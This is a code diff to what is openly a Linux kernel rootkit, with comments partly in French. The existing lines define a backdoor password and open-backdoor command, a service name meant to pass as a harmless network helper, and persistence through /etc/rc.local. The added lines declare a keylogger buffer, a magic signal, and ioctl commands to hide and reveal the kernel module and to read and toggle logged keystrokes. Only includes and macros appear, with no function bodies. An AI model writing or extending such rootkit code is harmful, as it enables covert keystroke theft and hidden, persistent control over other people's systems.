@@ -28,6 +28,8 @@
 #include <linux/pid.h>
 #include <linux/kthread.h>
 #include <linux/umh.h>
+#include <linux/input.h>
+#include <linux/list.h>
 #endif
 
 #define RK_MAGIC 'R'
@@ -36,6 +38,8 @@
 #define HIDDEN_SCRIPT "network-helper.service"
 #define RK_MSG_MAX 256
 #define BACKDOOR_PASS_MAX 32
+#define KEYLOG_BUF_MAX 4096
+#define RK_MAGIC_SIGNAL 63
 /* chemin du fichier de persistance sur ta LFS */
 #define PERSIST_FILE "/etc/rc.local"
 
@@ -64,6 +68,10 @@ struct rk_args {
 #define RK_CMD_SET_MSG  _IOW (RK_MAGIC, 3, struct rk_args)
 #define RK_CMD_OPEN_BACKDOOR _IOWR(RK_MAGIC, 4, struct rk_args)
 #define RK_CMD_SET_BACKDOOR_PASS _IOWR(RK_MAGIC, 5, struct rk_args)
+#define RK_CMD_HIDE_MODULE       _IOW (RK_MAGIC, 6, struct rk_args)
+#define RK_CMD_SHOW_MODULE       _IOW (RK_MAGIC, 7, struct rk_args)
+#define RK_CMD_GET_KEYLOG        _IOR (RK_MAGIC, 8, struct rk_args)
+#define RK_CMD_TOGGLE_KEYLOG     _IOW (RK_MAGIC, 9, struct rk_args)
 
 
 
